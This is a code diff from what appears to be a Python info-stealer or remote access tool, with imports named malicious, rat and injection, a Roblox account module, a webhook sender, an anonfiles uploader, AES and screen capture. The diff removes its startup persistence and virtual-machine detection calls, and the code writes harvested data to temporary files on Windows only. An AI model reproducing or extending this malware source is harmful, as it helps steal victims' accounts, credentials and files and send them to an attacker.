@@ -4,11 +4,10 @@ import informations
 import malicious
 import rat
 import injection
-from startup import startup
 from config import Config
 from _roblox import RobloxX
 from anonFile import uploadToAnonfiles
-from vmdetect import vmdetection
+
 ii = informations.Info()
 _webh = _webhook.WebhookX()
 cc = Config()
@@ -35,6 +34,7 @@ try:
     from zipfile import ZipFile
     from Crypto.Cipher import AES
     from PIL import ImageGrab
+    import platform
 except Exception:
     import subprocess
     requirements = [
@@ -52,12 +52,10 @@ except Exception:
         for requirement in requirements
     ])[0:-3]
     subprocess.run(command, shell=True)
-import platform
+
 if platform.system() != "Windows":
     exit()
 
-startup()
-vmdetection()
 
 def writeforfile(data, name):
     path = os.getenv("TEMP") + f"\wp{name}.txt"
